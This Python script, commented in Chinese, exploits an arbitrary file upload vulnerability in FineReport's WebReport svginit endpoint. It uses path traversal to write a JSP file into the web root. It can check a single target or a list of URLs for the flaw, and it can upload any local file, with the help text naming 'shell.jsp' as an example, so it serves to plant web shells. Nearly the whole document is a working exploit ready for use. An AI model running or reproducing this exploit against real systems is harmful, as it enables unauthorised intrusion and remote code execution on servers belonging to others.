#!/usr/bin/python3
import requests
from time import time
from json import dumps
import argparse
import secrets


# 用于伪装浏览器的请求头
user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0'

# 请求体的数据类型
content_type = 'text/xml;charset=UTF-8'

# 随机生成的文件名，用于上传和检测漏洞
random_file_name = secrets.token_hex(8) + '.svg.jsp'

# 上传文件的 URL 路径，其中 chartmapsvg/../../../../WebReport/ 表示上传文件存放的相对路径，
svg_file_path = '/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/' + random_file_name

# 上传文件后访问的 URL 路径，其中 random_file_name 表示文件名
svg_file_url = '/WebReport/' + random_file_name

# 随机生成的字符串，用于检测上传文件后的漏洞是否存在
rand_num = str(time()).split('.')[1]

# 检查是否存在上传漏洞
def check_arbitrary_file_upload_vulnerability(url):
    # 设置请求头
    headers = {
        'User-Agent': user_agent,
        'Content-Type': content_type
    }
    # 生成测试文件内容
    data = {
        '__CONTENT__': rand_num,
        '__CHARSET__': 'UTF-8'
    }
    try:
        # 发送POST请求上传文件
        url_upload = url + svg_file_path
        response = requests.post(url_upload, headers=headers, data=dumps(data))
        # 发送GET请求获取测试文件内容
        url_file = url + svg_file_url
        response = requests.get(url_file)

        # 如果测试文件内容包含随机数，说明上传成功
        if rand_num in response.text:
            print('[+]', url, '存在任意文件上传漏洞!')
            print('测试文件的路径为: ', url_file)
            print('测试文件的内容为: ', response.text)
            if args.o:  # 如果参数中存在 -o，表示需要将结果保存到文件中
                args.o.write(url+': 存在任意文件上传漏洞!\n')  # 使用 write 方法向文件中写入结果
            return True
    except requests.exceptions.RequestException as e:
        print('[-] 请求发生异常：', e)

    # 没有发现漏洞
    return False

# 上传文件
def upload(url, file_path):
    # 设置请求头部信息，包括浏览器标识和Content-Type
    headers = {
        'User-Agent': user_agent,
        'Content-Type': content_type
    }
    # 读取文件内容，构造上传数据
    data = {
    "__CONTENT__": file_path.read(),
    "__CHARSET__": "UTF-8"
    }
    try:
        # 发送 POST 请求，上传文件
        response = requests.post(url + svg_file_path, headers=headers, data=dumps(data))
        print('[+] 上传文件:', url + svg_file_url)
    except requests.exceptions.RequestException as e:
        # 捕获异常，输出错误信息
        print('[-] 请求发生异常：', e)

    return False


# 创建一个 ArgumentParser 对象 parser，用于解析命令行参数。
parser = argparse.ArgumentParser(description="", epilog="")

# 使用 add_mutually_exclusive_group 方法创建一个互斥的参数组 group，包含两个参数：-u 和 -f。这表示在命令行中只能使用其中一个参数，否则会抛出错误。
group = parser.add_mutually_exclusive_group(required=True)


#group.add_argument('-u',help='目标URL,如:http://test.com')

# 使用 add_argument 方法添加参数
# -u 参数表示目标 URL, 使用 help 参数添加参数的描述信息。
# -f 参数表示目标 URL 文件, 使用 type 参数指定文件类型为 'r', 使用 help 参数添加参数的描述信息。
# -lf 参数表示需要上传到目标服务器的文件, 使用 type 参数指定文件类型为 'r', 使用 help 参数添加参数的描述信息。
# -o 参数表示保存结果的文件, 使用 type 参数指定文件类型为 'w', 使用 help 参数添加参数的描述信息。
group.add_argument('-u', metavar='url', help='目标 URL, 如: http://test.com')
group.add_argument('-f', metavar='file', type=argparse.FileType('r',encoding='utf8'),help='目标 URL 文件')
parser.add_argument('-lf', metavar='local_file', type=argparse.FileType('r',encoding='utf8'),help='需要上传到目标服务器的本地文件, 如: shell.jsp')
parser.add_argument('-o', metavar='output_file', type=argparse.FileType('w', encoding='UTF-8'),help='保存结果到文本文件')

# 使用parse_args方法解析命令行参数，并将结果保存在args对象中。
args=parser.parse_args()

if args.u:
    if args.lf:  # 如果同时输入了 -u 和 -lf
        upload(args.u, args.lf)  # 只执行 upload 函数
    else:  # 否则执行 check_arbitrary_file_upload_vulnerability 函数
        check_arbitrary_file_upload_vulnerability(args.u)
if args.f:
    ul = args.f.read().split('\n')
    for u in ul:
        check_arbitrary_file_upload_vulnerability(u)
